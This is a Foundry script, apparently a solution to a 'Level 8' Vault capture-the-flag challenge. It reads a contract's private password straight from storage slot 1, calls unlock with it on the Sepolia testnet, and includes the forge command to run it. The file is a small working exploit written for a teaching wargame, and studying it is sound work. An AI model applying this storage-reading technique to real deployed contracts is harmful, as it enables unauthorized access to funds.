// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Vault} from "../src/level8.sol";

contract Level8Script is Script {
    bytes32 password;

    function run(address instanceAddress) external {
        Vault target = Vault(instanceAddress);
        password = vm.load(address(target), bytes32(uint256(1)));
        console.logBytes32(password);
        vm.startBroadcast();
        target.unlock(password);
        vm.stopBroadcast();
        console.log("target.locked: ", target.locked());
    }
}
//forge script script/script8.s.sol:Level8Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account yourkey --sig "run(address)" your instant address
